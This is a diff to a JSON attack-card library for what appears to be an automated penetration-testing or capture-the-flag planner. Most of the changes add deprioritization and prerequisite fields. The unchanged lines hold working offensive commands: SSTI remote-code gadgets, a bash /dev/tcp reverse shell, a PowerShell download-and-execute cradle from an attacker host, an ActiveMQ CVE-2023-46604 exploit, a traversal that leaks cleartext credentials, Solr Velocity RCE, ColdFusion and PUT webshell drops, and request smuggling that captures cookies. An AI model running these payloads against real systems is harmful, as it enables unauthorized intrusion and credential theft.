@@ -292,7 +292,12 @@
           "note": "Read it back: confirm the file can be reached and runs before doing anything further with it."
         }
       ],
-      "autonomy": "manual"
+      "autonomy": "manual",
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "sqli-basics",
@@ -402,7 +407,12 @@
           "note": "With the FILE privilege, LOAD_FILE reads arbitrary local files (here /etc/passwd, hex-encoded to avoid quoting). The same privilege enables INTO OUTFILE to write a web shell into the web root, which is how manual SQLi becomes a foothold."
         }
       ],
-      "autonomy": "manual"
+      "autonomy": "manual",
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "sqlmap-automation",
@@ -450,7 +460,12 @@
           "note": "Runs commands through the injection when the database account is privileged enough. Determine which account the DB runs under first."
         }
       ],
-      "autonomy": "manual"
+      "autonomy": "manual",
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "git-exposed",
@@ -462,6 +477,7 @@
         "git-dumper"
       ],
       "os": [],
+      "speculative": true,
       "requires_all": [],
       "requires_any": [
         "http.reachable",
@@ -510,6 +526,7 @@
         "svn"
       ],
       "os": [],
+      "speculative": true,
       "requires_all": [],
       "requires_any": [
         "http.reachable",
@@ -743,7 +760,12 @@
           "note": "Enumerate the available chains. Line the chain up with the libraries you can see in error messages, /WEB-INF dumps, or the app stack."
         }
       ],
-      "autonomy": "manual"
+      "autonomy": "manual",
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "jwt-attacks",
@@ -828,13 +850,13 @@
       "commands": [
         {
           "tool": "curl",
-          "run": "curl -s -G {{url}} --data-urlencode \"name={{'{{'}}7*7{{'}}'}}\"",
+          "run": "curl -s -G {{url}} --data-urlencode \"name=\\{\\{7*7\\}\\}\"",
           "note": "Confirm the engine: 49 is Jinja2/Twig-style, 7777777 is Twig concat, an error names the engine. That tells you which RCE gadget to use next."
         },
         {
           "tool": "curl",
           "run": "curl -s -G {{url}} --data-urlencode \"name={{ssti_rce_payload}}\"",
-          "note": "The engine-specific RCE gadget, e.g. Jinja2 {{'{{'}}cycler.__init__.__globals__.os.popen('id').read(){{'}}'}} or Freemarker <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}. uid=... in the response is code execution."
+          "note": "The engine-specific RCE gadget, e.g. Jinja2 \\{\\{cycler.__init__.__globals__.os.popen('id').read()\\}\\} or Freemarker <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}. uid=... in the response is code execution."
         },
         {
           "tool": "python3",
@@ -842,7 +864,12 @@
           "note": "Swap the command for a reverse shell one-liner (bash -i >& /dev/tcp/{{lhost}}/4444 0>&1, URL-encoded) and catch it with the listener card for a full foothold."
         }
       ],
-      "requires_any": []
+      "requires_any": [],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "http-put-webshell",
@@ -888,7 +915,12 @@
           "note": "When WebDAV is in play, davtest probes which extensions it will accept and execute, so you upload one that actually runs rather than guessing."
         }
       ],
-      "requires_any": []
+      "requires_any": [],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "authz-abuse",
@@ -934,7 +966,12 @@
           "note": "The payoff: an admin-only upload or template/config writer is code execution. Upload a webshell, request it (uid=...), and you have a foothold."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "nosql-injection",
@@ -1024,7 +1061,12 @@
           "note": "Set off the shell. Watch your listener."
         }
       ],
-      "autonomy": "manual"
+      "autonomy": "manual",
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "jenkins-access",
@@ -1076,7 +1118,11 @@
           "note": "Lists users. Also hit /securityRealm/user/admin/api/json for anonymous disclosure of a user."
         }
       ],
-      "autonomy": "manual"
+      "autonomy": "manual",
+      "deprioritize_when": [
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "wordpress",
@@ -1226,7 +1272,12 @@
           "note": "After confirmation: run a reverse shell through the injection. URL-encode the special characters (& → %26, spaces → +). Stand up the listener first (see listener-setup)."
         }
       ],
-      "autonomy": "manual"
+      "autonomy": "manual",
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "idor",
@@ -1416,7 +1467,12 @@
           "note": "Where PUT is honored on a writable path, drop a webshell in directly (the classic Tomcat/IIS case). Then GET it to confirm execution."
         }
       ],
-      "autonomy": "manual"
+      "autonomy": "manual",
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "web-shells",
@@ -1576,7 +1632,12 @@
           "note": "Only if the app let you upload a file: include it as JSP for code execution (the eval mode)."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
+      ]
     },
     {
       "id": "java-rmi",
@@ -2120,6 +2181,9 @@
           "run": "python3 activemq_cve_2023_46604.py -t {{target}} -p {{openwire_port|61616}} -u http://{{attacker_ip}}:{{attacker_port|8000}}/poc.xml",
           "note": "PREFERRED (OpenWire RCE Trigger): Sends a crafted OpenWire packet instructing ActiveMQ to load an XML Spring configuration containing a ProcessBuilder reverse shell."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     },
     {
@@ -2133,15 +2197,17 @@
       "os": [
         "windows"
       ],
+      "speculative": true,
       "requires_all": [],
       "requires_any": [
         "service.nvms1000",
-        "port:80",
+        "port:1000",
+        "vuln.nvms1000",
         "web.fingerprint.nvms"
       ],
       "produces": [
         "loot.files",
-        "objective.user_flag",
+        "objective.local_flag",
         "objective.root_flag"
       ],
       "priority": 86,
@@ -2172,6 +2238,10 @@
           "run": "curl -s -i \"http://{{target}}:{{web_port|80}}/../../../../../../../../Program%20Files/NSClient%2B%2B/nsclient.ini\"",
           "note": "LEAK NSCLIENT INI CREDENTIALS: Reads the NSClient++ configuration file to recover the cleartext web management console password."
         }
+      ],
+      "deprioritize_when": [
+        "objective.local_flag",
+        "objective.root_flag"
       ]
     },
     {
@@ -2226,7 +2296,12 @@
           "note": "Uploads the crafted image containing malicious DjVu metadata to trigger execution."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "foothold.linux",
+        "foothold.webshell",
+        "foothold.windows"
+      ]
     },
     {
       "id": "php-backdoor-useragent",
@@ -2273,7 +2348,12 @@
           "note": "Triggers an interactive reverse shell back to attacker listener via User-Agentt backdoor."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "foothold.linux",
+        "foothold.webshell",
+        "foothold.windows"
+      ]
     },
     {
       "id": "opennetadmin-rce",
@@ -2320,7 +2400,12 @@
           "note": "Triggers reverse shell through OpenNetAdmin xajax parameter injection."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "foothold.linux",
+        "foothold.webshell",
+        "foothold.windows"
+      ]
     },
     {
       "id": "nostromo-rce",
@@ -2366,7 +2451,12 @@
           "note": "Launches reverse shell through Nostromo directory traversal execution."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "foothold.linux",
+        "foothold.webshell",
+        "foothold.windows"
+      ]
     },
     {
       "id": "jackson-databind-rce",
@@ -2414,7 +2504,12 @@
           "note": "Sends crafted polymorphic Jackson JSON payload triggering remote JDBC execution of inject.sql."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "foothold.linux",
+        "foothold.webshell",
+        "foothold.windows"
+      ]
     },
     {
       "id": "pfsense-rrd-rce",
@@ -2425,11 +2520,9 @@
         "curl"
       ],
       "os": [],
+      "speculative": true,
       "phase": "access",
-      "requires_any": [
-        "http.reachable",
-        "credential.available"
-      ],
+      "requires_any": [],
       "produces": [
         "foothold.linux",
         "access.admin"
@@ -2458,7 +2551,14 @@
           "note": "Triggers interactive root reverse shell on pfSense FreeBSD appliance."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "http.reachable",
+        "credential.available"
+      ],
+      "deprioritize_when": [
+        "foothold.linux",
+        "access.admin"
+      ]
     },
     {
       "id": "web-config-upload-bypass",
@@ -2500,6 +2600,11 @@
           "run": "curl -s 'http://{{target}}/UploadedFiles/web.config'",
           "note": "Trigger execution of the uploaded web.config to execute embedded payload and establish reverse shell."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
       ]
     },
     {
@@ -2542,6 +2647,11 @@
           "run": "curl -s 'http://{{target}}/nibbleblog/content/private/plugins/my_image/image.php'",
           "note": "Request the renamed image.php payload inside the plugin directory to spawn reverse shell."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
       ]
     },
     {
@@ -2584,6 +2694,9 @@
           "run": "curl -s 'http://{{target}}:8983/solr/{{core}}/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+${rt}'",
           "note": "Trigger Velocity template injection on Solr select endpoint executing command via java.lang.Runtime."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     },
     {
@@ -2598,11 +2711,12 @@
       "os": [
         "linux"
       ],
-      "requires_all": [],
-      "requires_any": [
-        "credential.available",
-        "http.reachable"
+      "speculative": true,
+      "requires_all": [
+        "http.reachable",
+        "credential.available"
       ],
+      "requires_any": [],
       "produces": [
         "foothold.webshell"
       ],
@@ -2628,6 +2742,11 @@
           "run": "curl -s 'http://{{target}}/{{app_path}}/shell.php?c=id'",
           "note": "Trigger execution of the deployed webshell endpoint to establish initial foothold."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
       ]
     },
     {
@@ -2672,6 +2791,9 @@
           "run": "curl -s -X PROPFIND -H 'If: <http://{{target}}/' 'http://{{target}}/'",
           "note": "Probe target IIS 6.0 server to verify if WebDAV method handling is enabled."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.windows"
       ]
     },
     {
@@ -2686,6 +2808,7 @@
       "os": [
         "linux"
       ],
+      "speculative": true,
       "requires_all": [],
       "requires_any": [
         "http.reachable"
@@ -2804,6 +2927,9 @@
           "run": "python3 -c 'import urllib.parse; print(urllib.parse.quote(\"powershell -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://{{lhost}}/rev.ps1\\\")\"))'",
           "note": "URL-encode PowerShell reverse shell cradle payload for HTTP search parameter transmission."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.windows"
       ]
     },
     {
@@ -2848,6 +2974,11 @@
           "run": "curl -s -b cookies.txt -d 'taskName=rev&interval=Daily&schedule=1&startDate=01/01/2026&startTime=12:00:00&publish=1&file=C:\\ColdFusion8\\wwwroot\\CFIDE\\shell.jsp&fileURL=http://{{lhost}}/shell.jsp' 'http://{{target}}:8500/CFIDE/administrator/scheduler/scheduleedit.cfm'",
           "note": "Configure an administrative scheduled task in ColdFusion writing a reverse JSP webshell to webroot."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.windows",
+        "foothold.linux"
       ]
     },
     {
@@ -2893,6 +3024,11 @@
           "run": "curl -s 'http://{{target}}/shell.aspx?cmd=whoami'",
           "note": "Invoke uploaded webshell via HTTP GET request to verify command execution and establish foothold."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
       ]
     },
     {
@@ -2915,7 +3051,7 @@
         "http.reachable"
       ],
       "produces": [
-        "credential.session",
+        "credential.available",
         "access.admin"
       ],
       "priority": 85,
@@ -2940,6 +3076,10 @@
           "run": "curl -s -X POST -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary @smuggle_auth_capture.txt http://{{target}}/",
           "note": "Smuggle administrative query prefix to siphon subsequent user authorization headers and session cookies."
         }
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ]
     },
     {
@@ -2984,6 +3124,9 @@
           "run": "curl -s 'http://{{target}}/check.php?id=/var/log/nginx/access.log&c=whoami'",
           "note": "Trigger local file inclusion targeting poisoned Nginx access log to execute injected PHP commands."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     },
     {
@@ -3031,6 +3174,10 @@
           "run": "curl -s -d 'javax.faces.ViewState={{viewstate}}' http://{{target}}:8080/",
           "note": "Transmit forged DES-encrypted and HMAC-signed ViewState parameter to trigger server-side deserialization RCE."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.windows",
+        "foothold.linux"
       ]
     },
     {
@@ -3078,6 +3225,9 @@
           "run": "curl -s -b \"profile={{cookie_payload}}\" http://{{target}}:{{port}}/",
           "note": "Transmit crafted serialized cookie payload to trigger arbitrary code execution in vulnerable Node.js application."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     },
     {
@@ -3124,6 +3274,9 @@
           "run": "python3 50234.py --rhost {{target}} --rport 20000 --user {{user}} --password '{{password}}' --lhost {{lhost}} --lport {{lport}}",
           "note": "Authenticate to Usermin and trigger arbitrary command execution reverse shell via miniserv.pl."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     }
   ]
